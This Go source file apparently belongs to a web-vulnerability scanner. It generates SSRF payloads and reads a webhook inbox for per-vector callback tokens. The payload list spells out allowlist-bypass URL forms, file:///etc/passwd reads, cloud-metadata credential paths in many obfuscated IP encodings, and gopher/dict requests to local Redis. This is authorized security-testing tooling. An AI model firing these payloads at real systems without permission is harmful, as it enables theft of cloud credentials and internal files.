package utils

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// Building the payload list, and asking the webhook afterwards whether anything arrived.
//
// The flow this section runs on:
//
//  1. REcollapse mutates the operator's webhook URL, which is what defeats a validation regex.
//     The framework adds its own bypass forms on top, because REcollapse mutates BYTES and the
//     forms that actually get past an allowlist are structural: userinfo, a second host after a
//     backslash, a decimal-encoded address, a redirect through the allowed host.
//  2. The scanner fires that list at every eligible attack vector.
//  3. The webhook results URL is read, and any token that appears in it names the vector whose
//     payload got out.
//
// The token is what makes step 3 attribution rather than a guess. Every payload carries a per-vector
// marker in its path, so "something called back" becomes "the X-Forwarded-Host on this vector called
// back", which is the difference between a finding and a rumour.

// vectorTokenPlaceholder is the literal REcollapse mutates around. It is replaced with a per-vector
// token before the payload list is handed to the scanner: REcollapse runs ONCE per scan and the
// scanner runs per vector, so the token cannot be baked in at generation time.
const vectorTokenPlaceholder = "RS0NTOKEN"

// vectorToken is the marker for one vector in one scan. Short, because it has to survive being put
// in a path, and unique across both, because two scans of the same vector must not be confused.
func vectorToken(scanID, vectorID string) string {
	clean := func(s string) string { return strings.ReplaceAll(s, "-", "") }
	scan, vector := clean(scanID), clean(vectorID)
	if len(scan) > 8 {
		scan = scan[:8]
	}
	if len(vector) > 8 {
		vector = vector[:8]
	}
	return "rs0n" + scan + vector
}

// FrameworkSSRFPayloads are the forms the framework contributes, on top of REcollapse's mutations.
//
// These are STRUCTURAL rather than byte-level, which is the half REcollapse does not cover. Each one
// is a shape that has got past a real allowlist: credentials before the host so a naive parser reads
// the wrong side of the @, a backslash that some parsers treat as a separator and others do not, an
// address written as a decimal integer, and the scheme-relative form that keeps the victim's own
// scheme. The last few need no webhook at all, because an SSRF that reads cloud metadata or a local
// file proves itself in the response and never calls anybody.
func FrameworkSSRFPayloads(webhookURL, allowedHost string) []string {
	parsed, err := url.Parse(webhookURL)
	if err != nil || parsed.Host == "" {
		return nil
	}
	host := parsed.Host
	path := parsed.Path
	if path == "" {
		path = "/"
	}

	payloads := []string{
		webhookURL,
		"http://" + host + path,
		"https://" + host + path,
		"//" + host + path,
		"/\\/" + host + path,
		"\\/\\/" + host + path,
		"http:/" + host + path,
		"https:/" + host + path,
		"http:\\\\" + host + path,
		// The userinfo trick: a parser that reads the host as everything before the @ sends the
		// request to the wrong place from the one that validated it.
		"http://" + host + path + "@" + host + path,
		// The fragment trick, same idea from the other end.
		"http://" + host + path + "#" + host,
		"http://" + host + path + "?" + host,
	}

	// Where an allowed host is known, the forms that abuse it are worth sending: they are what gets
	// past a validator that checks "does this contain our domain".
	if allowedHost != "" {
		payloads = append(payloads,
			"http://"+allowedHost+"@"+host+path,
			"http://"+host+path+"#"+allowedHost,
			"http://"+host+"."+allowedHost+path,
			"http://"+allowedHost+"."+host+path,
		)
	}

	// The ones that need no callback at all. An SSRF that returns the response proves itself, and
	// these are the targets worth asking for. ALL OF THESE ARE SELF-PROVING, so they stay LAST, after
	// every redirect/host-confusion form above: ProbeSSRFVector records one proof per signal in list
	// order, and keeping the response reads after the redirect forms is what stops a medium open
	// redirect from masking a high file or metadata read on the same parameter. None of them carries
	// the webhook host or the canary placeholder, so none of them touches per-parameter attribution.
	payloads = append(payloads,
		"file:///etc/passwd",
		"file:///c:/windows/win.ini",

		// Cloud instance metadata. The canonical dotted quad is the address a block list stops by name;
		// MOST forms below are 169.254.169.254 written so a naive check does not recognise it (decimal,
		// hex, octal, mixed, trailing-dot, IPv6-mapped, nip.io/sslip.io), alongside the AWS credentials
		// leaf, the Azure and GCP-by-address paths, Google's metadata.google.internal, Alibaba's
		// 100.100.100.200, and 0.0.0.0 (a loopback/metadata-equivalent some stacks route to the IMDS).
		// Until now only 127.0.0.1 carried its alternate encodings, so a filter that blocked just the
		// canonical metadata address let all of these straight through.
		"http://169.254.169.254/latest/meta-data/",
		"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
		"http://169.254.169.254/metadata/instance?api-version=2021-02-01",
		"http://metadata.google.internal/computeMetadata/v1/",
		"http://169.254.169.254/computeMetadata/v1/",
		"http://100.100.100.200/latest/meta-data/",
		"http://2852039166/latest/meta-data/",
		"http://0xA9FEA9FE/latest/meta-data/",
		"http://0xA9.0xFE.0xA9.0xFE/latest/meta-data/",
		"http://0251.0376.0251.0376/latest/meta-data/",
		"http://0xA9.0376.169.0xFE/latest/meta-data/",
		"http://169.254.43518/latest/meta-data/",
		"http://169.254.169.254./latest/meta-data/",
		"http://[::ffff:169.254.169.254]/latest/meta-data/",
		"http://[::ffff:a9fe:a9fe]/latest/meta-data/",
		"http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/",
		"http://0.0.0.0/latest/meta-data/",
		"http://169.254.169.254.nip.io/latest/meta-data/",
		"http://169.254.169.254.sslip.io/latest/meta-data/",

		"http://127.0.0.1/",
		"http://127.0.0.1:22/",
		"http://[::1]/",
		"http://2130706433/",
		"http://0177.0.0.1/",

		"dict://127.0.0.1:6379/info",
		"gopher://127.0.0.1:6379/_INFO",
		"ftp://127.0.0.1/",
		"sftp://127.0.0.1/",
		"ldap://127.0.0.1/",
		"tftp://127.0.0.1/",
	)

	// The userinfo bypass aimed at the metadata address: a validator reading the host as everything
	// before the @ sees the allowed host and passes it, while the fetcher connects to what follows.
	// Only when an allowed host is known, because without one there is nothing to put before the @.
	if allowedHost != "" {
		payloads = append(payloads,
			"http://"+allowedHost+"@169.254.169.254/latest/meta-data/",
			"http://"+allowedHost+"@2852039166/latest/meta-data/",
		)
	}
	return payloads
}

// WebhookHit is one interaction the results URL reported.
type WebhookHit struct {
	Token string
	Raw   string
}

// CheckWebhookResults reads the results URL and reports which tokens appear in it.
//
// Deliberately dumb about the format. webhook.site returns JSON, a self-hosted listener might return
// text, and a third might return HTML; what they all have in common is that the token appears
// somewhere in the body if the request arrived. Parsing a specific schema would work with one
// service and silently find nothing with the next.
func CheckWebhookResults(ctx context.Context, settings map[string]any, tokens map[string]string) (
	[]WebhookHit, error) {

	resultsURL := strings.TrimSpace(stringifySetting(settings["resultsWebhookURL"]))
	if resultsURL == "" {
		return nil, fmt.Errorf("no webhook results URL is configured")
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, resultsURL, nil)
	if err != nil {
		return nil, err
	}
	if header := strings.TrimSpace(stringifySetting(settings["resultsAuthHeader"])); header != "" {
		if name, value, ok := strings.Cut(header, ":"); ok {
			req.Header.Set(strings.TrimSpace(name), strings.TrimSpace(value))
		}
	}

	// Redirects are NOT followed. A results URL that answers 3xx is almost always an
	// authentication redirect, and following it lands on a login page that is a perfectly good
	// 200 with no tokens in it. Since this function decides whether an out-of-band callback
	// arrived by substring-searching the body, that reads as "the target never called out",
	// which is the one wrong answer this whole section exists to avoid.
	//
	// Measured against a private webhook.site token: GET /token/{id}/requests answers
	// 302 to https://webhook.site/login, both with no auth header and with a wrong one.
	//
	// A NoFollowClient rather than an http.Client with CheckRedirect, because the latter does not
	// keep the 3xx: net/http parses Location before it consults CheckRedirect, so the login
	// redirect this comment is about would have come back as a transport error instead.
	client := NewNoFollowClient(&http.Client{Timeout: 30 * time.Second})
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	// Capped, because a busy webhook inbox can be very large and the whole body is only being
	// substring searched.
	body, err := io.ReadAll(io.LimitReader(resp.Body, 8<<20))
	if err != nil {
		return nil, err
	}
	// Anything that is not a 2xx means the body is not the inbox, so it cannot be searched for
	// tokens. 3xx is called out separately because it has a specific and very common cause.
	if resp.StatusCode >= 300 {
		if resp.StatusCode < 400 {
			return nil, fmt.Errorf("the results URL answered %d and redirected to %q instead of "+
				"returning the received requests. That is an authentication redirect: the inbox is "+
				"private. Set the section's results auth header, which for webhook.site is "+
				"\"Api-Key: <your api key>\", or make the URL public. Nothing was read, so this is "+
				"NOT evidence that no callback arrived",
				resp.StatusCode, resp.Header.Get("Location"))
		}
		return nil, fmt.Errorf("the results URL answered %d, so it could not be read", resp.StatusCode)
	}

	text := string(body)
	var hits []WebhookHit
	for token, vectorID := range tokens {
		if strings.Contains(text, token) {
			hits = append(hits, WebhookHit{Token: token, Raw: vectorID})
		}
	}
	return hits, nil
}

// webhookSettleDelay is how long the scanner waits before reading the results URL.
//
// An out-of-band interaction is asynchronous by definition: the target makes its request after
// answering ours, and a queue or a retry can put seconds between the two. Reading immediately finds
// an empty inbox and reports no SSRF on a target that is about to call.
const webhookSettleDelay = 20 * time.Second

// webhookSecondOrderDelay is how long AFTER the first read the scanner waits before reading the
// results URL a second and final time.
//
// webhookSettleDelay covers the target that fetches the payload WHILE it answers. A STORED SSRF does
// not: the payload is saved and a backend job (a thumbnailer, a link unfurler, a webhook retry, a
// moderation queue) fetches it later, on the timescale a queue, a cron or a retry runs on, long after
// the first read gave up and reported nothing out of band. This second read is the one that turns
// that late callback into a finding, attributed by its canary to the exact vector and parameter that
// planted it. Minutes, not seconds, for that reason; a scan that already ran for hours can afford it,
// and it is the last thing the run does.
const webhookSecondOrderDelay = 3 * time.Minute

// Phase labels for collectWebhookFindings, so a failed read records which window went unchecked: the
// whole out-of-band half (first read) or only the delayed stored-SSRF window (second-order re-poll).
const (
	webhookPhaseFirst       = "first read"
	webhookPhaseSecondOrder = "second-order re-poll"
)
